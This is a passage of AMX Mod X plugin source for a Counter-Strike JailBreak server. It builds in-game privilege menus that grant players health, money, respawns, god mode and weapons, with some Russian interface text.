	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_DeltaMenu");
}

public Handle_DeltaMenu(id, iKey)
{
    if(g_iDayMode != 1 && g_iDayMode != 2) return PLUGIN_HANDLED;

	new szName[32];
	get_user_name(id, szName, charsmax(szName));
	
	switch(iKey)
	{
		case 0: return Cmd_SpawnPlayer(id);
		case 1:
        {
		     set_pev(id, pev_health, pev(id, pev_health) + 33.0 );
             g_iDeltaData[id][HP_DELTA] = 0;
             UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_DELTA_HP", szName);
        }
		case 2:
		{
			SetBit(g_iBitHingJump, id);
			g_iDeltaData[id][MEGA_JUMP_DELTA] = 0;
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_DELTA_JUMP", szName);
		}
		case 3:
		{
			jbe_set_user_money(id, g_iUserMoney[id] + g_iAllCvars[DELTA_MONEY_NUM], 1);
			g_iDeltaData[id][MONEY_DELTA] = 0;
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_DELTA_MONEY", szName);
		}	
		case 4:
		{
			jbe_add_user_free(id);
			g_iDeltaData[id][FD_DELTA] = 0;
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_DELTA_FD", szName);
		}		
		case 8: return Show_PrivilegesMenu(id);
		case 9: return PLUGIN_HANDLED;
	}
	return Show_DeltaMenu(id);
}

Show_DyavolMenu(id)
{
	if(g_iDayMode != 1 && g_iDayMode != 2 || jbe_menu_blocked(id)) return PLUGIN_HANDLED;
	
	new szMenu[1024], iKeys = (1<<8|1<<9), iAlive = IsSetBit(g_iBitUserAlive, id), iLen = formatex(szMenu, charsmax(szMenu), "\w%L^n^n", id, "JBE_MENU_DYAVOL_TITLE");
	
	if(iAlive && g_iDyavolData[id][SKINES_DYAV] >= g_iAllCvars[DYAVOL_SKIN_ROUND])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%L^n", id, "JBE_MENU_DYAVOL_SKIN");
		iKeys |= (1<<0);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_DYAVOL_SKIN", g_iAllCvars[DYAVOL_SKIN_ROUND]);
	
	if(iAlive && g_iDyavolData[id][JUMP_DYAV] >= g_iAllCvars[DYAVOL_JUMP_ROUND])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%L^n", id, "JBE_MENU_DYAVOL_JUMP");
		iKeys |= (1<<1);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_DYAVOL_JUMP", g_iAllCvars[DYAVOL_JUMP_ROUND]);
	
	if(iAlive && g_iDyavolData[id][MONEY_DYAV] >= g_iAllCvars[DYAVOL_MONEY_ROUND])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \w%L^n", id, "JBE_MENU_DYAVOL_MONEY", g_iAllCvars[DYAVOL_MONEY_NUM]);
		iKeys |= (1<<2);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_DYAVOL_MONEY", g_iAllCvars[DYAVOL_MONEY_NUM], g_iAllCvars[DYAVOL_MONEY_ROUND]);
	
	if(iAlive && g_iDyavolData[id][WANTED_DYAV] >= g_iAllCvars[DYAVOL_WANTED_ROUND])
	{
		if(IsSetBit(g_iBitUserWanted, id))
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[6] \w%L^n", id, "JBE_MENU_DYAVOL_WANTED");
			iKeys |= (1<<3);
		}
		else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\wВы не в розыске\d]^n", id, "JBE_MENU_DYAVOL_WANTED");
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_DYAVOL_WANTED", g_iAllCvars[DYAVOL_WANTED_ROUND]);
	
	if(iAlive && g_iDyavolData[id][LONG_DYAV] >= g_iAllCvars[DYAVOL_RUN_ROUND])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[5] \w%L^n", id, "JBE_MENU_DYAVOL_RUN");
		iKeys |= (1<<4);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_DYAVOL_RUN", g_iAllCvars[DYAVOL_RUN_ROUND]);
	
	if(iAlive && g_iDyavolData[id][DAMAGE_DYAV] >= g_iAllCvars[DYAVOL_DAMAGE_ROUND])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[6] \w%L^n", id, "JBE_MENU_DYAVOL_DAMAGE");
		iKeys |= (1<<5);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_DYAVOL_DAMAGE", g_iAllCvars[DYAVOL_DAMAGE_ROUND]);
	
	if(iAlive && g_iDyavolData[id][SCOUT_DYAV] >= g_iAllCvars[DYAVOL_SCOUT_ROUND])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[7] \w%L^n", id, "JBE_MENU_DYAVOL_SCOUT");
		iKeys |= (1<<6);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_DYAVOL_SCOUT", g_iAllCvars[DYAVOL_SCOUT_ROUND]);
	
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L", id, "JBE_MENU_BACK");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_DyavolMenu");
}

public Handle_DyavolMenu(id, iKey)
{
    if(g_iDayMode != 1 && g_iDayMode != 2) return PLUGIN_HANDLED;

	new szName[32];
	get_user_name(id, szName, charsmax(szName));
	
	switch(iKey)
	{
		case 0:
        {    
			jbe_set_user_model(id, g_szPlayerModel[DEMON]);
            g_iDyavolData[id][SKINES_DYAV] = 0;
            UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_DYAVOL_SKIN", szName);          
        }	
		case 1:
		{
			SetBit(g_iBitHingJump, id);
			g_iDyavolData[id][JUMP_DYAV] = 0;
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_DYAVOL_JUMP", szName);
		}	
		case 2:
		{
			jbe_set_user_money(id, g_iUserMoney[id] + g_iAllCvars[DYAVOL_MONEY_NUM], 1);
			g_iDyavolData[id][MONEY_DYAV] = 0;
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_DELTA_MONEY", szName);
		}		
		case 3:
		{
			jbe_sub_user_wanted(id);
			g_iDyavolData[id][WANTED_DYAV] = 0;
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_DYAVOL_WANTED", szName);
		}
		case 4:
		{
			jbe_user_long(id);
			g_iDyavolData[id][LONG_DYAV] = 0;
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_DYAVOL_RUN", szName);
		}
		case 5:
		{
			SetBit(g_iBitDoubleDamage, id);
			g_iDyavolData[id][DAMAGE_DYAV] = 0;
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_DYAVOL_DAMAGE", szName);
		}
		case 6:
		{  
            fm_give_item(id, "weapon_scout");
            fm_set_user_bpammo(id, CSW_SCOUT, 10);
			g_iDyavolData[id][SCOUT_DYAV] = 0;
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_DYAVOL_SCOUT", szName);
		}
		case 8: return Show_PrivilegesMenu(id);
		case 9: return PLUGIN_HANDLED;
	}
	return Show_DyavolMenu(id);
}

Cmd_SpawnPlayer(id) return Show_SpawnPlayerMenu(id, g_iMenuPosition[id] = 0);
Show_SpawnPlayerMenu(id, iPos)
{
	new iPlayersNum;
	for(new i = 1; i <= MAX_PLAYERS; i++)
	{
		if(IsNotSetBit(g_iBitUserConnected, i) || IsSetBit(g_iBitUserAlive, i) || (g_iUserTeam[i] != 1 && g_iUserTeam[i] != 2) || !g_szWantedNames[0]) continue;
		g_iMenuPlayers[id][iPlayersNum++] = i;
	}
	new iStart = iPos * PLAYERS_PER_PAGE;
	if(iStart > iPlayersNum) iStart = iPlayersNum;
	iStart = iStart - (iStart % 8);
	g_iMenuPosition[id] = iStart / PLAYERS_PER_PAGE;
	new iEnd = iStart + PLAYERS_PER_PAGE;
	if(iEnd > iPlayersNum) iEnd = iPlayersNum;
	new szMenu[512], iLen, iPagesNum = (iPlayersNum / PLAYERS_PER_PAGE + ((iPlayersNum % PLAYERS_PER_PAGE) ? 1 : 0));
	switch(iPagesNum)
	{
		case 0:
		{
			UTIL_SayText(id, "%L %L", id, "JBE_PREFIX", id, "JBE_CHAT_ID_PLAYERS_NOT_VALID");
			return Show_DeltaMenu(id);
		}
		default: iLen = formatex(szMenu, charsmax(szMenu), "\wКого возродим? [%d/%d]^n^n", iPos + 1, iPagesNum);
	}
	new szName[32], i, iKeys = (1<<9), b;
	for(new a = iStart; a < iEnd; a++)
	{
		i = g_iMenuPlayers[id][a];
		get_user_name(i, szName, charsmax(szName));
		iKeys |= (1<<b);
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[%d] \w%s^n", ++b, szName);
	}
	for(new i = b; i < PLAYERS_PER_PAGE; i++) iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n");
	if(iEnd < iPlayersNum) 
	{
		iKeys |= ( 1<<8 );
		formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \wДалее^n\r[0] \w%s", iPos ? "Назад" : "Выход" );
	}
	else formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n^n\r[0] \w%s", iPos ? "Назад" : "Выход" );
	return show_menu(id, iKeys, szMenu, -1, "Show_SpawnPlayerMenu");
}

public Handle_SpawnPlayerMenu(id, iKey)
{
	switch(iKey)
	{
		case 8: return Show_SpawnPlayerMenu(id, ++g_iMenuPosition[id]);
		case 9: return Show_SpawnPlayerMenu(id, --g_iMenuPosition[id]);
		default:
		{
			new iTarget = g_iMenuPlayers[id][g_iMenuPosition[id] * PLAYERS_PER_PAGE + iKey], TmpName1[32], TmpName2[32];
			get_user_name(iTarget, TmpName2, charsmax(TmpName2)); 
			get_user_name(id, TmpName1, charsmax(TmpName1));
			ExecuteHamB(Ham_CS_RoundRespawn, iTarget);
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_DELTA_RES", TmpName1, TmpName2);
			g_iDeltaData[id][RES_NUM_DELTA]--;
		}
	}
	return Show_DeltaMenu(id);
}

Show_PrezidentMenu_1(id)
{
	if(g_iDayMode != 1 && g_iDayMode != 2 || jbe_menu_blocked(id)) return PLUGIN_HANDLED;
	
	new szMenu[1024], iKeys = (1<<8|1<<9), iAlive = IsSetBit(g_iBitUserAlive, id), iLen = formatex(szMenu, charsmax(szMenu), "\w%L^n^n", id, "JBE_MENU_PREZIDENT_TITLE_1");
	
	if(!iAlive && g_iPresidentData[id][RES_PREZ] >= g_iAllCvars[PRESIDENT_RS_ROUND])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%L^n\d> Даже при бунте.^n^n", id, "JBE_MENU_PREZIDENT_RES");
		iKeys |= (1<<0);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \d[\rчрз %d рнд\d]^n\d> Даже при бунте.^n^n", id, "JBE_MENU_PREZIDENT_RES", g_iAllCvars[PRESIDENT_RS_ROUND]);
	
	if(iAlive && g_iPresidentData[id][NABOR_PREZ] >= g_iAllCvars[PRESIDENT_NABOR_ROUND])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%L^n", id, "JBE_MENU_PREZIDENT_NABOR");
		iKeys |= (1<<1);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \d[\rчрз %d рнд\d]^n\d> Грава, Скорость^n> Двойнуха, Бхоп^n> Гранаты, HP.^n^n", id, "JBE_MENU_PREZIDENT_NABOR", g_iAllCvars[PRESIDENT_NABOR_ROUND]);
	
	if(iAlive && g_iPresidentData[id][LATCHKEY_PREZ] >= g_iAllCvars[PRESIDENT_LATHCEY_ROUND] && jbe_get_user_team(id) == 1)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \w%L^n", id, "JBE_MENU_PREZIDENT_LATHCEY");
		iKeys |= (1<<2);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_PREZIDENT_LATHCEY", g_iAllCvars[PRESIDENT_LATHCEY_ROUND]);
	
	if(iAlive && g_iPresidentData[id][PUMPKIN_PREZ] >= g_iAllCvars[PRESIDENT_PUMPKIN_ROUND])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4] \w%L^n", id, "JBE_MENU_PREZIDENT_PUMPKIN");
		iKeys |= (1<<3);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_PREZIDENT_PUMPKIN", g_iAllCvars[PRESIDENT_PUMPKIN_ROUND]);
	
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L", id, "JBE_MENU_BACK");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_PrezidentMenu_1");
}

public Handle_PrezidentMenu_1(id, iKey)
{
    if(g_iDayMode != 1 && g_iDayMode != 2) return PLUGIN_HANDLED;

	new szName[32];
	get_user_name(id, szName, charsmax(szName));
	
	switch(iKey)
	{
        case 0:
        {
            ExecuteHamB(Ham_CS_RoundRespawn, id);
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_PRESIDENT_RES", szName);
			UTIL_SendAudio(0, _, g_szSounds[PRIV_RES]);
			g_iPresidentData[id][RES_PREZ] = 0;
            return PLUGIN_HANDLED;
        }
		case 1:
        {
            if(IsNotSetBit(g_iBitUserAlive, id)) return Show_PrezidentMenu_1(id);
            
            SetBit(g_iBitFastRun, id);
            ExecuteHamB(Ham_Player_ResetMaxSpeed, id);
            set_pev(id, pev_gravity, 0.6);
            SetBit(g_iBitDoubleJump, id);
            SetBit(g_iBitAutoBhop, id);
            set_pev(id, pev_health, 250.0);
            fm_give_item(id, "weapon_hegrenade");
            fm_give_item(id, "weapon_flashbang");
            fm_give_item(id, "weapon_flashbang");
            SetBit(g_iBitFrostNade, id);
            fm_give_item(id, "weapon_smokegrenade");
            
            UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_PRESIDENT_NABOR", szName);
            g_iPresidentData[id][NABOR_PREZ] = 0;
        }
		case 2:
        {
            SetBit(g_iBitLatchkey, id);
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_PRESIDENT_LATCHKEY", szName);
            g_iPresidentData[id][LATCHKEY_PREZ] = 0;
        }
		case 3:
        {
            give_weapon_pumkin(id);
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_PREZIDENT_PUMPKIN", szName);
			g_iPresidentData[id][PUMPKIN_PREZ] = 0;
        }
		case 8: return Show_PrivilegesMenu(id);
		case 9: return PLUGIN_HANDLED;
	}
	return Show_PrezidentMenu_1(id);
}

Show_PrezidentMenu_2(id)
{
	if(g_iDayMode != 1 && g_iDayMode != 2 || jbe_menu_blocked(id)) return PLUGIN_HANDLED;
	
	new szMenu[1024], iKeys = (1<<8|1<<9), iAlive = IsSetBit(g_iBitUserAlive, id), iLen = formatex(szMenu, charsmax(szMenu), "\w%L^n^n", id, "JBE_MENU_PREZIDENT_TITLE_2");
	
	if(!iAlive && g_iPresidentData[id][RES_PREZ] >= g_iAllCvars[PRESIDENT_RS_ROUND])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%L\d> Даже при бунте.^n- Даже без разрешения^n^n", id, "JBE_MENU_PREZIDENT_RES");
		iKeys |= (1<<0);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \d[\rчрз %d рнд\d]^n\d> Даже при бунте.^n- Даже без разрешения^n^n", id, "JBE_MENU_PREZIDENT_RES", g_iAllCvars[PRESIDENT_RS_ROUND]);
	
	if(iAlive && g_iPresidentData[id][PATRON_PREZ] >= g_iAllCvars[PRESIDENT_PATRON_ROUND] && g_iUserTeam[id] == 2)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%L^n", id, "JBE_MENU_PREZIDENT_PATRON");
		iKeys |= (1<<1);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_PREZIDENT_PATRON", g_iAllCvars[PRESIDENT_PATRON_ROUND]);
	
	if(iAlive && g_iPresidentData[id][SHOCKER_PREZ] >= g_iAllCvars[PRESIDENT_SHOCKER_ROUND] && g_iUserTeam[id] == 2)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \w%L^n", id, "JBE_MENU_PREZIDENT_SHOCKER");
		iKeys |= (1<<2);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_PREZIDENT_SHOCKER", g_iAllCvars[PRESIDENT_SHOCKER_ROUND]);
	
	if(iAlive && g_iPresidentData[id][GRENADE_PREZ] >= g_iAllCvars[PRESIDENT_GRANADE_ROUND])
	{
		if(g_iUserTeam[id] == 2)
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4] \w%L^n", id, "JBE_MENU_PREZIDENT_GRENADE");
			iKeys |= (1<<3);
		}
		else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \r[Охрана]^n", id, "JBE_MENU_PREZIDENT_GRENADE");
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_PREZIDENT_GRENADE", g_iAllCvars[PRESIDENT_GRANADE_ROUND]);
	
	if(iAlive && g_iChiefId == id)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[5] \w%L^n", id, "JBE_MENU_PREZIDENT_NARUCH");
		iKeys |= (1<<4);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \r[Начальник]^n", id, "JBE_MENU_PREZIDENT_NARUCH");
	
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L", id, "JBE_MENU_BACK");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_PrezidentMenu_2");
}

public Handle_PrezidentMenu_2(id, iKey)
{
    if(g_iDayMode != 1 && g_iDayMode != 2) return PLUGIN_HANDLED;

	new szName[32];
	get_user_name(id, szName, charsmax(szName));
	
	switch(iKey)
	{
        case 0:
        {
            ExecuteHamB(Ham_CS_RoundRespawn, id);
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_PRESIDENT_RES", szName);
			UTIL_SendAudio(0, _, g_szSounds[PRIV_RES]);
			g_iPresidentData[id][RES_PREZ] = 0;
            return PLUGIN_HANDLED;
        }
		case 1:
        {
            SetBit(g_iBitUnlimitedAmmo, id);
		    UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_PRESIDENT_PATRON", szName);
            g_iPresidentData[id][PATRON_PREZ] = 0;
        }
		case 2:
        {
            SetBit(g_iBitShocker, id);
		    UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_PRESIDENT_SHOCKER", szName);
            g_iPresidentData[id][SHOCKER_PREZ] = 0;
        }
		case 3:
        {
            give_weapon_shield(id);
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_PRESIDENT_GRENADE", szName);
			g_iPresidentData[id][GRENADE_PREZ] = 0;
        }
		case 4:
		{
			if(g_iChiefId == id)
			{
				return Show_CuffMenu_1(id);
			}
		}
		case 8: return Show_PrivilegesMenu(id);
		case 9: return PLUGIN_HANDLED;
	}
	return Show_PrezidentMenu_2(id);
}

Show_EliteMenu(id)
{
	if(g_iDayMode != 1 && g_iDayMode != 2 || jbe_menu_blocked(id)) return PLUGIN_HANDLED;
	new szMenu[512], iKeys = (1<<7|1<<8|1<<9), iAlive = IsSetBit(g_iBitUserAlive, id), iLen = formatex(szMenu, charsmax(szMenu), "\w%L^n^n", id, "JBE_MENU_ELITE_TITLE");
	
	if((g_iDayMode == 1 || g_iDayMode == 2) && !g_szWantedNames[0])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%L^n", id, "JBE_MENU_ELITE_RESPAWN");
		iKeys |= (1<<0);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \w%L^n", id, "JBE_MENU_ELITE_RESPAWN");
	
	if(iAlive && g_iEliteSpeed[id] && g_iEliteData[id][SPEED_ELITE] >= g_iAllCvars[ELITE_SPEED_ROUND])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%L \w[\d%d\w]^n", id, "JBE_MENU_ELITE_SPEED", g_iEliteSpeed[id]);
		iKeys |= (1<<1);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_ELITE_SPEED", g_iAllCvars[ELITE_SPEED_ROUND]);
	
	if(iAlive && g_iEliteGrav[id] && g_iEliteData[id][GRAV_ELITE] >= g_iAllCvars[ELITE_GRAV_ROUND])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \w%L \w[\d%d\w]^n", id, "JBE_MENU_ELITE_GRAV", g_iEliteGrav[id]);
		iKeys |= (1<<2);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_ELITE_GRAV", g_iAllCvars[ELITE_GRAV_ROUND]);
	
	if(iAlive && g_iEliteHealth[id] && g_iEliteData[id][HEALTH_ELITE] >= g_iAllCvars[ELITE_HEALTH_ROUND])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4] \w%L \w[\d%d\w]^n", id, "JBE_MENU_ELITE_HEALTH", g_iEliteHealth[id]);
		iKeys |= (1<<3);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_ELITE_HEALTH", g_iAllCvars[ELITE_HEALTH_ROUND]);
	
	if(iAlive && g_iEliteFd[id] && g_iEliteData[id][ELITE_FD] >= g_iAllCvars[ELITE_FD_ROUND])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[5] \w%L^n", id, "JBE_MENU_ELITE_FD");
		iKeys |= (1<<4);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_ELITE_FD", g_iAllCvars[ELITE_FD_ROUND]);
	
	if(iAlive && g_iEliteData[id][GOD_ELIT] >= g_iAllCvars[ELITE_GOD_ROUND] && jbe_get_user_team(id) == 2)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[6] \w%L^n", id, "JBE_MENU_ELITE_GOD");
		iKeys |= (1<<5);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_ELITE_GOD", g_iAllCvars[ELITE_GOD_ROUND]);
	
	if(iAlive && g_iEliteData[id][MONEY_ELIT] >= g_iAllCvars[ELITE_MONEY_ROUND])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[7] \w%L^n", id, "JBE_MENU_ELITE_MONEY", g_iAllCvars[ELITE_MONEY_NUM]);
		iKeys |= (1<<6);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_ELITE_MONEY", g_iAllCvars[ELITE_MONEY_NUM], g_iAllCvars[ELITE_MONEY_ROUND]);
	
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L", id, "JBE_MENU_BACK");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_EliteMenu");
}

public Handle_EliteMenu(id, iKey)
{
	if(g_iDayMode != 1 && g_iDayMode != 2) return PLUGIN_HANDLED;
	new szName[32];
	get_user_name(id, szName, charsmax(szName));
	switch(iKey)
	{
        case 0: return Show_EliteRespawn(id);
		case 1: return Cmd_GiveFustMenu(id);
		case 2: return Cmd_GiveGravMenu(id);
		case 3: return Cmd_GiveHealthMenu(id);
		case 4: return Cmd_GiveFdMenu(id);
		case 5:
        {
            set_user_godmode(id, 1);
            g_iEliteData[id][GOD_ELIT] = 0;
            UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_ELITE_GOD", szName);
        }
		case 6:
		{
			jbe_set_user_money(id, g_iUserMoney[id] + g_iAllCvars[ELITE_MONEY_NUM], 1);
			g_iEliteData[id][MONEY_ELIT] = 0;
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_ELITE_MONEY", szName);
		}
		case 8: return Show_PrivilegesMenu(id);
		case 9: return PLUGIN_HANDLED;
	}
	return Show_EliteMenu(id);
}

Show_EliteRespawn(id)
{
	if(g_szWantedNames[0]) return PLUGIN_HANDLED;
	
	new szMenu[512], iKeys = (1<<0|1<<1|1<<2|1<<3|1<<8|1<<9), iLen = formatex(szMenu, charsmax(szMenu), "%L^n^n", id, "JBE_MENU_ELITE_RESPAWN_TITLE");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%L^n", id, "JBE_MENU_ELITE_RESPAWN_CT");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%L^n", id, "JBE_MENU_ELITE_RESPAWN_TT");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \w%L^n", id, "JBE_MENU_ELITE_RESPAWN_ALL");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4] \w%L^n", id, "JBE_MENU_ELITE_RESPAWN_PLAYER");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L", id, "JBE_MENU_BACK");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_EliteRespawn");
}

public Handle_EliteRespawn(id, iKey)
{
	if(g_szWantedNames[0]) return PLUGIN_HANDLED;
	new szName[32]; get_user_name(id, szName, charsmax(szName));
	switch(iKey)
	{
		case 0:
		{
			for(new i = 1; i <= g_iMaxPlayers; i++)
			{
				if(IsSetBit(g_iBitUserConnected, i) && g_iUserTeam[i] == 2 && IsNotSetBit(g_iBitUserAlive, i))
				{
					ExecuteHamB(Ham_CS_RoundRespawn, i);
				}
			}
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_ELITE_RESPAWN_KT", szName);
			UTIL_SendAudio(0, _, g_szSounds[PRIV_RES]);
		}
